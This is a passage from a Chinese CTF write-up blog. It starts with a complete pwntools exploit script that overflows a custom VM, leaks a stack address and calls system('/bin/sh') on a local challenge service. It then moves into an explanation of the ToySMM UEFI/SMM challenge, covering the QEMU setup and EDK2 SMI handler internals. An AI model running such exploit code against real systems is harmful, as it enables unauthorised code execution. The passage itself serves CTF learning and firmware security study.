class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmnop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmadd</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmsub</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmul</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmdiv</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmod</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmand</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmxor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmnot</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmcall</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(addr))+<span class="hljs-string">b&#x27;\x0b&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmret</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(addr))+<span class="hljs-string">b&#x27;\x0c&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmlea</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(offset))+<span class="hljs-string">b&#x27;\x0d&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush1</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0e&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush2</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0f&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush4</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush8</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x11&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmoutput</span>(<span class="hljs-params">offset,cnt</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(cnt))+vmlea(offset)+vmpush8(p64(<span class="hljs-number">0x14242c101498d2fc</span>))+<span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vminput</span>(<span class="hljs-params">offset,cnt</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(cnt))+vmlea(offset)+vmpush8(p64(<span class="hljs-number">0xf06d7659e3c6851c</span>))+<span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmodcall</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjne</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x13&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjl</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x14&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjg</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x15&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmdup</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x16&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmhlt</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x17&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>shellcode=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>*<span class="hljs-number">3</span>)+p64(<span class="hljs-number">0x100</span>)+p64(<span class="hljs-number">0x14e</span>)+p64(<span class="hljs-number">0xfffffffffffe0000</span>)+p64(<span class="hljs-number">0x8d</span>)<br>pause()<br>p.sendafter(<span class="hljs-string">b&#x27;Start your exploit from here!&#x27;</span>,shellcode)<br>pause()<br><br>shellcode=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x98</span>+<span class="hljs-string">b&#x27;\x01\x0c&#x27;</span><br>shellcode=shellcode.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>shellcode+=vmlea(<span class="hljs-number">0</span>)+vmoutput(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>)+vminput(<span class="hljs-number">0xfffffffffffe0200</span>,<span class="hljs-number">0x20000</span>-<span class="hljs-number">0x200</span>)+vmret(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment"># overflow</span><br>p.send(shellcode)<br>vmstack=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x820000</span><br>stack=vmstack+<span class="hljs-number">0x20000</span>+<span class="hljs-number">8</span><br>system_addr=vmstack+<span class="hljs-number">0x930000</span>+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vmstack))<br><br>shellcode=vmpush8(p64(<span class="hljs-number">0</span>))+vmdup()+vmpush8(p64(<span class="hljs-number">1</span>))+vmadd()+vmdup()<br>shellcode+=vmpush8(p64((<span class="hljs-number">0x20000</span>-<span class="hljs-number">0x30</span>)//<span class="hljs-number">8</span>-<span class="hljs-number">4</span>))+vmsub()<br>shellcode+=vmpush8(p64(<span class="hljs-number">0x209</span>))+vmjg()<br>shellcode+=vmpush8(<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()<br>shellcode+=vmpush4(<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span>)+vmdup()+vmpush4(<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">4</span>)<br>shellcode+=vmpush8(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()*<span class="hljs-number">0xe6</span><br>shellcode+=vmpush8(p64(vmstack+<span class="hljs-number">0x840740</span>))+vmpush8(p64(vmstack+<span class="hljs-number">0x8410e0</span>))+vmpush8(p64(vmstack+<span class="hljs-number">0x840740</span>))<br>shellcode+=vmpush8(p64(<span class="hljs-number">1</span>))+vmpush8(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()*(<span class="hljs-number">736</span>//<span class="hljs-number">8</span>-<span class="hljs-number">1</span>)<br>shellcode+=vmpush8(p64(vmstack+<span class="hljs-number">0x800400</span>))+vmpush4(p32(<span class="hljs-number">8</span>))+vmoutput(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>)<br>shellcode=shellcode.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>shellcode+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span>+p64((stack&lt;&lt;<span class="hljs-number">0x11</span>)|((stack&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>))<br>shellcode+=p64((system_addr&lt;&lt;<span class="hljs-number">0x11</span>)|((system_addr&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>))<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="ToySMM"><a href="#ToySMM" class="headerlink" title="ToySMM"></a>ToySMM</h1><p>\呆神&#x2F; \呆神&#x2F; \呆神&#x2F;</p>
+<h2 id="先康康附件"><a href="#先康康附件" class="headerlink" title="先康康附件"></a>先康康附件</h2><p>尝试改变一下思维方式，不能什么都追溯到宇宙洪荒，效率低学习成本高容易劝退，说不定走一步看一步会有奇效：）</p>
+<h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">! /bin/sh</span><br><br>cp OVMF_VARS.fd OVMF_VARS_copy.fd<br><br>./qemu-system-x86_64 \<br>  -no-reboot \<br>  -machine q35,smm=on \	# 使用Intel Q35主板，开启SMM<br>  -cpu max \<br>  -net none \<br>  -serial stdio \	# 串口输出重定向至标准输入输出<br>  -display none \<br>  -vga none \<br>  -global ICH9-LPC.disable_s3=1 \	# 禁用ICH9-LPC设备的S3睡眠状态<br>  -global driver=cfi.pflash01,property=secure,value=on \	<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">启用QEMU内部的CFI（Common Flash Interface）模拟驱动，并设置其属性为secure</span><br>  -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">指定使用pflash驱动，并将OVMF_CODE.fd文件作为虚拟机的固件映像（Firmware Image），设置为只读</span><br>  -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">指定使用pflash驱动，并将OVMF_VARS_copy.fd文件作为虚拟机的变量存储映像，用于保存虚拟机的变量状态</span><br>  -drive format=raw,file=fat:rw:rootfs\<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">指定使用raw格式的驱动，并将rootfs文件作为虚拟机的硬盘驱动器</span><br>  -debugcon file:debug.log\	# 将调试输出重定向到debug.log文件<br>  -global isa-debugcon.iobase=0x402	# 设置调试串口的I/O基地址为0x402<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>CFI：一种用于模拟闪存设备的接口，CFI模拟驱动允许将虚拟机中的一块区域映射为可供虚拟机访问的闪存设备</li>
+<li>-global：设置全局设备<ul>
+<li>driver：设置了全局的driver pflash的配置，这里是secure on<ul>
+<li>之后如果-driver选项通过if设置的接口类型为pflash则使用这个全局的配置</li>
+</ul>
+</li>
+<li>pflash01：01表示设备的索引或编号</li>
+</ul>
+</li>
+<li>OVMF_CODE.fd：<ul>
+<li>if&#x3D;pflash：使用pflash接口</li>
+<li>format&#x3D;raw：驱动器为原始格式</li>
+<li>unit&#x3D;0：驱动器单元号为0</li>
+<li>file&#x3D;OVMF_CODE.fd：指定驱动映像文件</li>
+<li>readonly&#x3D;on：只读</li>
+</ul>
+</li>
+<li>OVMF_VARS_copy.fd同上</li>
+</ul>
+<h3 id="kvmvapic-bin"><a href="#kvmvapic-bin" class="headerlink" title="kvmvapic.bin"></a>kvmvapic.bin</h3><p>qemu使用的BIOS ROM，因为不是本地的qemu所以需要这个文件</p>
+<h3 id="OVMF"><a href="#OVMF" class="headerlink" title="OVMF"></a>OVMF</h3><p>部分内容来自2023HWS的ppt</p>
+<ul>
+<li>UEFI：一种标准，用来定义操作系统与系统固件之间的软件界面，作为BIOS的替代方案</li>
+<li>EKD2：第二代UEFI的官方开发库，UEFI的一份实现代码</li>
+<li>OVMF：一个固件，可以在虚拟机上运行的edk2包</li>
+</ul>
+<h3 id="rootfs"><a href="#rootfs" class="headerlink" title="rootfs"></a>rootfs</h3><p>rootfs作为硬盘驱动被载入</p>
+<ul>
+<li>startupn.nsh：UEFI shell的shell脚本</li>
+<li>ToyApp.efi：UEFI模块</li>
+</ul>
+<h2 id="我是谁我在哪我要干什么"><a href="#我是谁我在哪我要干什么" class="headerlink" title="我是谁我在哪我要干什么"></a>我是谁我在哪我要干什么</h2><p>先捋一下题目干了什么我们要干什么</p>
+<p>题目主要有两个部分</p>
+<ul>
+<li>ToySMM：一个SMM模块</li>
+<li>ToyApp：一个efi模块</li>
+</ul>
+<h3 id="ToySMM-1"><a href="#ToySMM-1" class="headerlink" title="ToySMM"></a>ToySMM</h3><ul>
+<li><p>这是一个SMM模块（工具：UEFITool）</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/toysmm.png" srcset="/img/loading.gif" lazyload class title="toysmm">
+</li>
+<li><p>模块入口函数ToySMM_entry_5DB9425E（工具：efiXplorer）</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/toyentry.png" srcset="/img/loading.gif" lazyload class title="toyentry">
+
+<p>大概分为三部分：</p>
+<ul>
+<li><p>利用EFI_SMM_BASE2_PROTOCOL的GetSmstLocation服务获取EFI_SMM_SYSTEM_TABLE2</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/smmbase.png" srcset="/img/loading.gif" lazyload class title="smmbase">
+
+<p>这个结构体主要提供一些服务（结构体部分成员如下）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EFI_SMM_SYSTEM_TABLE2</span> &#123;</span><br>  <span class="hljs-comment">/// 内存服务，申请或释放SMRAM</span><br>  EFI_ALLOCATE_POOL                       SmmAllocatePool;<br>  EFI_FREE_POOL                           SmmFreePool;<br>  EFI_ALLOCATE_PAGES                      SmmAllocatePages;<br>  EFI_FREE_PAGES                          SmmFreePages;<br><br>  <span class="hljs-comment">/// Protocol服务</span><br>  EFI_INSTALL_PROTOCOL_INTERFACE      SmmInstallProtocolInterface;<br>  EFI_UNINSTALL_PROTOCOL_INTERFACE    SmmUninstallProtocolInterface;<br>  EFI_HANDLE_PROTOCOL                 SmmHandleProtocol;<br>  EFI_SMM_REGISTER_PROTOCOL_NOTIFY    SmmRegisterProtocolNotify;<br>  EFI_LOCATE_HANDLE                   SmmLocateHandle;<br>  EFI_LOCATE_PROTOCOL                 SmmLocateProtocol;<br><br>  <span class="hljs-comment">/// SMI处理函数</span><br>  EFI_SMM_INTERRUPT_MANAGE            SmiManage;<br>  EFI_SMM_INTERRUPT_REGISTER          SmiHandlerRegister;<br>  EFI_SMM_INTERRUPT_UNREGISTER        SmiHandlerUnRegister;<br>&#125;;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>利用EFI_SMM_ACCESS2_PROTOCOL的GetCapabilities服务获取EFI_SMRAM_DESCRIPTOR</p>
+<ul>
+<li>先令GetCapabilities的SmramMap参数为0获取size</li>
+<li>再申请内存</li>
+<li>再通过GetCapabilities获取EFI_SMRAM_DESCRIPTOR</li>
+<li>再通过size&gt;&gt;5获取EFI_SMRAM_DESCRIPTOR的个数（EFI_SMRAM_DESCRIPTOR32字节）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  EFI_PHYSICAL_ADDRESS    PhysicalStart;<br>  EFI_PHYSICAL_ADDRESS    CpuStart;<br>  UINT64                  PhysicalSize;<br>  UINT64                  RegionState;<br>&#125; EFI_MMRAM_DESCRIPTOR;<br><br><span class="hljs-keyword">typedef</span> EFI_MMRAM_DESCRIPTOR EFI_SMRAM_DESCRIPTOR;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>然后是一些Hob操作，看不懂（</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/hob.png" srcset="/img/loading.gif" lazyload class title="hob">
+</li>
+<li><p>然后又是一些看不懂的操作…</p>
+<ul>
+<li>之后输出ToySMM模块的加载基址</li>
+<li>利用SmiHandlerRegister注册SMM handler</li>
+</ul>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/register.png" srcset="/img/loading.gif" lazyload class title="register"></li>
+</ul>
+</li>
+</ul>
+<h3 id="ToyApp"><a href="#ToyApp" class="headerlink" title="ToyApp"></a>ToyApp</h3><p>从输出来判断一下这个app的功能：</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/app.png" srcset="/img/loading.gif" lazyload class title="app">
+
+<ul>
+<li>输入shellcode</li>
+<li>输入Done执行shellcode</li>
+<li>输入QUIT退出</li>
+</ul>
+<p>ToyApp.efi入口函数_ModuleEntryPoint执行的就是这个功能（反汇编完依托答辩）</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/shit.png" srcset="/img/loading.gif" lazyload class title="shit">
+
+<p>动态加载地址可以搜索字符串确定（注意UTF-16LE）</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/run.png" srcset="/img/loading.gif" lazyload class title="run">
+
+<h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><ul>
+<li>SMM功能：<ul>
+<li>提供一块隔离内存SMRAM，包含代码和数据</li>
+<li>只有SMM（ring -2）可以访问</li>
+</ul>
+</li>
+<li>进入SMM：<ul>
+<li>发出SMI，向0xB2端口写入数据就可以触发SMI</li>
+</ul>
+</li>
+</ul>
+<h3 id="SmiHandlerRegister"><a href="#SmiHandlerRegister" class="headerlink" title="SmiHandlerRegister"></a>SmiHandlerRegister</h3><p>看一下SmiHandlerRegister的源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">SmiHandlerRegister</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="hljs-params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="hljs-params">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="hljs-params">  )</span><br>&#123;<br>  SMI_HANDLER  *SmiHandler;<br>  SMI_ENTRY    *SmiEntry;<br>  LIST_ENTRY   *List;<br><br>    <span class="hljs-comment">// 1. 新建一个SMI_HANDLER</span><br>  <span class="hljs-keyword">if</span> ((Handler == <span class="hljs-literal">NULL</span>) || (DispatchHandle == <span class="hljs-literal">NULL</span>)) &#123;<br>    <span class="hljs-keyword">return</span> EFI_INVALID_PARAMETER;<br>  &#125;<br><br>  SmiHandler = AllocateZeroPool (<span class="hljs-keyword">sizeof</span> (SMI_HANDLER));<br>  <span class="hljs-keyword">if</span> (SmiHandler == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> EFI_OUT_OF_RESOURCES;<br>  &#125;<br><br>  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;<br>  SmiHandler-&gt;Handler    = Handler;<br>  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 2. 利用SmmCoreFindSmiEntry将SmiHandler插入mSmiEntryList</span><br>  <span class="hljs-keyword">if</span> (HandlerType == <span class="hljs-literal">NULL</span>) &#123;<br>    SmiEntry = &amp;mRootSmiEntry;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);<br>    <span class="hljs-keyword">if</span> (SmiEntry == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> EFI_OUT_OF_RESOURCES;<br>    &#125;<br>  &#125;<br><br>  List = &amp;SmiEntry-&gt;SmiHandlers;<br><br>  SmiHandler-&gt;SmiEntry = SmiEntry;<br>  InsertTailList (List, &amp;SmiHandler-&gt;Link);<br><br>    <span class="hljs-comment">// 3. 返回SmiHandler</span><br>  *DispatchHandle = (EFI_HANDLE)SmiHandler;<br><br>  <span class="hljs-keyword">return</span> EFI_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>SMI_HANDLER结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMI_HANDLER_SIGNATURE  SIGNATURE_32(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN                           Signature;<br>  LIST_ENTRY                      Link;       <span class="hljs-comment">// Link on SMI_ENTRY.SmiHandlers</span><br>  EFI_SMM_HANDLER_ENTRY_POINT2    Handler;    <span class="hljs-comment">// The smm handler&#x27;s entry point</span><br>  UINTN                           CallerAddr; <span class="hljs-comment">// The address of caller who register the SMI handler.</span><br>  SMI_ENTRY                       *SmiEntry;<br>  VOID                            *Context;    <span class="hljs-comment">// for profile</span><br>  UINTN                           ContextSize; <span class="hljs-comment">// for profile</span><br>&#125; SMI_HANDLER;<br></code></pre></td></tr></table></figure>
+
+<p>这里的EFI_SMM_HANDLER_ENTRY_POINT2是个函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_MM_HANDLER_ENTRY_POINT)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE  DispatchHandle,</span><br><span class="hljs-params">  IN CONST VOID  *Context         OPTIONAL,</span><br><span class="hljs-params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span><br><span class="hljs-params">  IN OUT UINTN   *CommBufferSize  OPTIONAL</span><br><span class="hljs-params">  )</span>;<br><br><span class="hljs-keyword">typedef</span>  EFI_MM_HANDLER_ENTRY_POINT      EFI_SMM_HANDLER_ENTRY_POINT2;<br></code></pre></td></tr></table></figure>
+
+<p>ToySMM中注册的是ToyMain函数</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/registersmm.png" srcset="/img/loading.gif" lazyload class title="registersmm">
+
+<h3 id="gcSmiHandlerTemplate"><a href="#gcSmiHandlerTemplate" class="headerlink" title="gcSmiHandlerTemplate"></a>gcSmiHandlerTemplate</h3><p>通过SMI进入SMM后：</p>
+<ul>
+<li>会将当前状态存在SMBASE + 0x8000 + 0x7c00，比如各个寄存器的值</li>
+<li>执行SMBASE + 0x8000处的代码</li>
+</ul>
+<p>SMBASE + 0x8000会被初始化为gcSmiHandlerTemplate</p>
+<p>函数调用链：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">gcSmiHandlerTemplate<br>-&gt; SmiRendezvous<br>-&gt; BSPHandler<br>-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry<br>   SmmEntryPoint<br>-&gt; SmiManage (IMAGE, GUID, CommBuffer)<br></code></pre></td></tr></table></figure>
+
+<p>SmiManage中最后会执行之前注册的Handler，ToySMM中是ToyMain</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Status             = SmiHandler-&gt;Handler (<br>                                   (EFI_HANDLE)SmiHandler,<br>                                   Context,<br>                                   CommBuffer,<br>                                   CommBufferSize<br>                                   );<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>SmmEntryPoint将gSmmCorePrivate-&gt;CommunicationBuffer的数据传递给了SmiManage，gSmmCorePrivate是个全局变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">……<br>  <br>   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;<br>   BufferSize          = gSmmCorePrivate-&gt;BufferSize;<br>  <br>……<br>  <br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;<br>       <span class="hljs-comment">// BufferSize was updated by the SafeUintnSub() call above.</span><br>       Status = SmiManage (<br>                  &amp;CommunicateHeader-&gt;HeaderGuid,<br>                  <span class="hljs-literal">NULL</span>,<br>                  CommunicateHeader-&gt;Data,<br>                  &amp;BufferSize<br>                  );<br>   ……<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>SmiManage调用SmmCoreFindSmiEntry通过HandlerType（GUID）查找之前注册的SmiHandler，调用Handler</p>
